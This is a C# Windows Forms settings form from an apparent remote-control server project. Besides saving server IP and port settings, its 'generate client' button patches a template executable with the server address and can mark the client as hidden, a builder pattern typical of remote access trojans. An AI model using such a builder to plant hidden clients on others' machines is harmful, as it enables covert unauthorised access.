using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Server
{
    public partial class FrmSettings : FrmBase
    {
        public FrmSettings()
        {
            InitializeComponent();
            this.EnableCancelButton = true;
        }

        private void FrmSettings_Load(object sender, EventArgs e)
        {
            base.EnableCancelButton = true;
            this.textBoxServerIP.Text = Settings.CurrentSettings.ClientPara.ServerIP;
            this.textBoxServerPort.Text = Settings.CurrentSettings.ClientPara.ServerPort.ToString();
            this.textBoxLocalServerPort.Text = Settings.CurrentSettings.ServerPort.ToString();
        }

        private void buttonSaveServerSetting_Click(object sender, EventArgs e)
        {
            string cServerIP = this.textBoxServerIP.Text.Trim();
            int cServerPort;
            if (!int.TryParse(this.textBoxServerPort.Text, out cServerPort))
                return;
            int sServerPort;
            if (!int.TryParse(this.textBoxLocalServerPort.Text, out sServerPort))
                return;
            if (string.IsNullOrWhiteSpace(this.textBoxServiceName.Text))
                return;
            string serviceName = this.textBoxServiceName.Text.Trim();
            string avatar = this.pictureBoxAvatar.Tag.ToString();
            Settings.CurrentSettings.ClientPara.ServerIP = cServerIP;
            Settings.CurrentSettings.ClientPara.ServerPort = cServerPort;
            Settings.CurrentSettings.ClientPara.ServiceName = serviceName;
            Settings.CurrentSettings.ClientPara.OnlineAvatar = avatar;
            Settings.CurrentSettings.ServerPort = sServerPort;
            Settings.SaveSettings();
            this.Close();
        }

        private void buttonGenClient_Click(object sender, EventArgs e)
        {
            string serverIP = this.textBoxServerIP.Text.Trim();
            string serverPort = this.textBoxServerPort.Text.Trim();
            int serverPortNum;
            if (!int.TryParse(serverPort, out serverPortNum))
                return;
            if (string.IsNullOrWhiteSpace(this.textBoxServiceName.Text))
                return;
            string serviceName = this.textBoxServiceName.Text.Trim();
            string avatar = this.pictureBoxAvatar.Tag.ToString();

            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "可执行程序(*.exe)|*.exe|所有文件(*.*)|*.*";
            dialog.FilterIndex = 1;
            if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                ClientParameters para = new ClientParameters();
                para.SetServerIP(serverIP);
                para.ServerPort = serverPortNum;
                para.ServiceName = serviceName;
                para.OnlineAvatar = avatar;

                byte[] fileBytes = null;
                if (System.IO.File.Exists("RemoteControl.Client.dat"))
                {
                    // 读取本地文件
                    fileBytes = System.IO.File.ReadAllBytes("RemoteControl.Client.dat");
                }
                else
                {
                    MsgBox.ShowInfo("RemoteControl.Client.dat文件丢失！");
                    return;
                    // 读取资源文件
                    //fileBytes = ResUtil.GetResFileData("RemoteControl.Client.dat"); 
                }
                ClientParametersManager.WriteClientStyle(fileBytes,
                    this.checkBoxHideClient.Checked ? ClientParametersManager.ClientStyle.Hidden : ClientParametersManager.ClientStyle.Normal);
                ClientParametersManager.WriteParameters(fileBytes, dialog.FileName, para);
                MsgBox.ShowInfo("客户端生成成功！");
            }
        }

        private void buttonSelectIP_Click(object sender, EventArgs e)
        {
            var ips = Utils.GetIPAddressV4();
            ContextMenuStrip cms = new ContextMenuStrip();
            ips.ForEach(a =>
            {
                cms.Items.Add(a, null, (o, args) =>
                {
                    this.textBoxServerIP.Text = a;
                });
            });
            cms.Show(this.buttonSelectIP, new Point(0, buttonSelectIP.Height));
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void pictureBoxAvatar_Click(object sender, EventArgs e)
        {
            var frm = new FrmSelectAvatar();
            if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string avatarFile = frm.SelectedAvatarFile;
                string avatarFileName = System.IO.Path.GetFileName(avatarFile);
                this.pictureBoxAvatar.Tag = avatarFileName;
                this.pictureBoxAvatar.BackgroundImage = Image.FromFile(avatarFile);
            }
        }
    }
}
